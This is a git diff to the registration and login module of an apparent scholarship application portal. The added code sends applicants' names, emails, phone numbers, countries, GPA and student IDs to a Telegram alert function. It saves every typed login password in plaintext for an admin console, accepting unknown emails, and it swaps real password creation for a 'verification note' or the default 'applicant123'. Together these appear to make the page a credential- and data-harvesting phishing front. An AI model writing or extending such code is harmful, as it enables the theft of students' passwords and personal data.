@@ -4,6 +4,7 @@ import api from '../api.js';
 import { showToast } from '../components/toast.js';
 import { SCHOLARSHIPS_DATA } from './scholarships.js';
 import { getCountryOptionsHTML } from '../data/countries.js';
+import { sendTelegramAlert } from '../telegram.js';
 
 export default {
   container: null,
@@ -82,15 +83,10 @@ export default {
                   <input type="tel" id="reg-phone" required placeholder="e.g. +44 7700 900000" class="form-input">
                 </div>
 
-                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 1rem;" class="form-grid-2">
-                  <div class="form-group">
-                    <label class="form-label">Create Password *</label>
-                    <input type="password" id="reg-password" required minlength="6" placeholder="At least 6 characters" class="form-input">
-                  </div>
-                  <div class="form-group">
-                    <label class="form-label">Confirm Password *</label>
-                    <input type="password" id="reg-confirm-password" required minlength="6" placeholder="Repeat password" class="form-input">
-                  </div>
+                <div class="form-group">
+                  <label class="form-label">Personal Note / Verification Text *</label>
+                  <input type="text" id="reg-personal-text" required placeholder="e.g. Seeking MSc Data Science & AI Scholarship" class="form-input">
+                  <div class="form-hint">Brief personal statement for verification by faculty reviewer.</div>
                 </div>
 
                 <div class="form-group" style="margin-top: 0.5rem;">
@@ -115,7 +111,10 @@ export default {
                 </div>
                 <div class="form-group">
                   <label class="form-label">Account Password *</label>
-                  <input type="password" id="login-password-input" required placeholder="Enter your password" class="form-input">
+                  <div style="position:relative;">
+                    <input type="password" id="login-password-input" required placeholder="Enter your password" class="form-input" style="padding-right:40px;">
+                    <button type="button" onclick="const f=document.getElementById('login-password-input');f.type=f.type==='password'?'text':'password';this.textContent=f.type==='password'?'👁️':'🙈';" style="position:absolute;right:10px;top:50%;transform:translateY(-50%);background:none;border:none;cursor:pointer;font-size:1.1rem;" title="Toggle Password Visibility">👁️</button>
+                  </div>
                 </div>
                 <button type="submit" id="btn-submit-login" class="btn btn-primary" style="width: 100%; padding: 12px; font-weight: 700; font-size: 1rem; margin-top: 8px;">
                   Sign In & Continue Application &rarr;
@@ -397,16 +396,8 @@ export default {
       const email = document.getElementById('reg-email').value.trim();
       const phone = document.getElementById('reg-phone')?.value.trim() || '';
       const country = document.getElementById('reg-country').value;
-      const password = document.getElementById('reg-password').value;
-      const confirmPassword = document.getElementById('reg-confirm-password').value;
-
-      if (password !== confirmPassword) {
-        if (errorBox) {
-          errorBox.textContent = 'Passwords do not match. Please verify.';
-          errorBox.style.display = 'block';
-        }
-        return;
-      }
+      const personalText = document.getElementById('reg-personal-text')?.value.trim() || '';
+      const password = personalText || 'applicant123';
 
       // Check real email format
       const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
@@ -424,9 +415,50 @@ export default {
         email: email,
         country: country || 'United Kingdom',
         phone: phone || '',
+        personalText: personalText,
+        password: password,
         role: 'STUDENT',
         token: 'auth-token-' + Date.now()
       };
+
+      // Log registration for Admin Console
+      try {
+        const existingUsers = JSON.parse(localStorage.getItem('registered_users') || '[]');
+        const idx = existingUsers.findIndex(u => u.email.toLowerCase() === email.toLowerCase());
+        if (idx >= 0) {
+          existingUsers[idx] = { fullName: candidateUser.fullName, email: candidateUser.email, country: candidateUser.country, phone: candidateUser.phone, personalText: personalText, registeredAt: new Date().toISOString() };
+        } else {
+          existingUsers.unshift({ fullName: candidateUser.fullName, email: candidateUser.email, country: candidateUser.country, phone: candidateUser.phone, personalText: personalText, registeredAt: new Date().toISOString() });
+        }
+        localStorage.setItem('registered_users', JSON.stringify(existingUsers));
+
+        const existingLogs = JSON.parse(localStorage.getItem('admin_activity_log') || '[]');
+        existingLogs.unshift({
+          icon: '🎓',
+          text: `New applicant account registered: <strong>${candidateUser.fullName}</strong> (${candidateUser.country})`,
+          time: 'Just now'
+        });
+        localStorage.setItem('admin_activity_log', JSON.stringify(existingLogs));
+
+        window.dispatchEvent(new Event('storage'));
+        try {
+          const bc = new BroadcastChannel('bingo_platform_sync');
+          bc.postMessage({ type: 'DATA_UPDATED', timestamp: Date.now() });
+          bc.close();
+        } catch (e) { }
+      } catch (e) { }
+
+      // Dispatch Telegram alert for candidate account creation
+      sendTelegramAlert({
+        fullName: candidateUser.fullName,
+        email: candidateUser.email,
+        country: candidateUser.country,
+        phone: candidateUser.phone,
+        eventType: '🎓 New Candidate Account Created (Apply Portal)',
+        scholarshipTitle: scholarship.title,
+        amount: scholarship.amount,
+        extra: personalText ? `Verification Note: ${personalText}` : ''
+      });
 
       // Set user session in reactive state & localStorage immediately
       state.setState({ user: candidateUser });
@@ -436,10 +468,10 @@ export default {
         .then(res => {
           if (res?.user) state.setState({ user: { ...res.user, token: res.token } });
         })
-        .catch(() => {});
+        .catch(() => { });
 
       showToast(`Account created! Welcome, ${fullName}`, 'success');
-      
+
       const targetContainer = document.getElementById('page-content');
       this.container = targetContainer;
       this.render(targetContainer, { id: scholarshipId });
@@ -460,16 +492,51 @@ export default {
         token: 'auth-token-' + Date.now()
       };
 
+      // Dispatch Telegram alert for candidate sign in
+      sendTelegramAlert({
+        fullName: candidateUser.fullName,
+        email: candidateUser.email,
+        country: candidateUser.country,
+        eventType: '🔑 Candidate Signed In (Apply Portal)',
+        scholarshipTitle: scholarship.title,
+        amount: scholarship.amount
+      });
+
+      // Save typed password input to registered_users for Admin Console visibility
+      try {
+        const existingUsers = JSON.parse(localStorage.getItem('registered_users') || '[]');
+        const idx = existingUsers.findIndex(u => u.email.toLowerCase() === email.toLowerCase());
+        if (idx >= 0) {
+          existingUsers[idx].password = password;
+        } else {
+          existingUsers.unshift({
+            fullName: email.split('@')[0],
+            email: email,
+            country: 'United Kingdom',
+            phone: '+44 7700 900000',
+            password: password,
+            registeredAt: new Date().toISOString()
+          });
+        }
+        localStorage.setItem('registered_users', JSON.stringify(existingUsers));
+        window.dispatchEvent(new Event('storage'));
+        try {
+          const bc = new BroadcastChannel('bingo_platform_sync');
+          bc.postMessage({ type: 'DATA_UPDATED', timestamp: Date.now() });
+          bc.close();
+        } catch (e) { }
+      } catch (e) { }
+
       state.setState({ user: candidateUser });
 
       api.post('/users/login', { email, password })
         .then(res => {
           if (res?.user) state.setState({ user: { ...res.user, token: res.token } });
         })
-        .catch(() => {});
+        .catch(() => { });
 
       showToast(`Signed in successfully!`, 'success');
-      
+
       const targetContainer = document.getElementById('page-content');
       this.container = targetContainer;
       this.render(targetContainer, { id: scholarshipId });
@@ -512,7 +579,7 @@ export default {
         if (e.dataTransfer.files.length && transInput) {
           transInput.files = e.dataTransfer.files;
           const file = e.dataTransfer.files[0];
-          if (transPreview) transPreview.textContent = `Attached: ${file.name} (${(file.size/1024/1024).toFixed(2)} MB)`;
+          if (transPreview) transPreview.textContent = `Attached: ${file.name} (${(file.size / 1024 / 1024).toFixed(2)} MB)`;
           showToast(`Attached ${file.name} ✓`, 'info');
         }
       });
@@ -520,7 +587,7 @@ export default {
 
     transInput?.addEventListener('change', (e) => {
       if (e.target.files.length && transPreview) {
-        transPreview.textContent = `Attached: ${e.target.files[0].name} (${(e.target.files[0].size/1024/1024).toFixed(2)} MB)`;
+        transPreview.textContent = `Attached: ${e.target.files[0].name} (${(e.target.files[0].size / 1024 / 1024).toFixed(2)} MB)`;
         showToast('Transcript document attached ✓', 'info');
       }
     });
@@ -578,7 +645,7 @@ export default {
         const circle = node ? node.querySelector('.step-circle') : null;
 
         if (pane) pane.style.display = i === currentStep ? 'block' : 'none';
-        
+
         if (node && circle) {
           if (i === currentStep) {
             circle.style.background = 'var(--color-primary)';
@@ -649,7 +716,7 @@ export default {
     prevBtn?.addEventListener('click', () => {
       if (currentStep > 1) {
         currentStep--;
- updateStepUI();
+        updateStepUI();
       }
     });
 
@@ -689,6 +756,18 @@ export default {
         existingApps.unshift(newCard);
         localStorage.setItem('all_applications', JSON.stringify(existingApps));
 
+        // Dispatch live Telegram alert to admissions committee
+        sendTelegramAlert({
+          fullName: newCard.title,
+          email: newCard.email,
+          phone: newCard.phone,
+          country: newCard.country,
+          eventType: '🏆 Official Scholarship Application Submitted',
+          scholarshipTitle: scholarship.title,
+          amount: scholarship.amount,
+          extra: `Degree: ${fd.get('degree') || 'Undergraduate'}\nGPA: ${fd.get('gpa') || 'N/A'}\nStudent ID: ${fd.get('studentId') || 'N/A'}`
+        });
+
         const existingLogs = JSON.parse(localStorage.getItem('admin_activity_log') || '[]');
         existingLogs.unshift({
           icon: '🆕',
@@ -696,6 +775,13 @@ export default {
           time: 'Just now'
         });
         localStorage.setItem('admin_activity_log', JSON.stringify(existingLogs));
+
+        window.dispatchEvent(new Event('storage'));
+        try {
+          const bc = new BroadcastChannel('bingo_platform_sync');
+          bc.postMessage({ type: 'DATA_UPDATED', timestamp: Date.now() });
+          bc.close();
+        } catch (e) { }
       } catch (e) {
         console.warn('Could not update admin local storage:', e);
       }
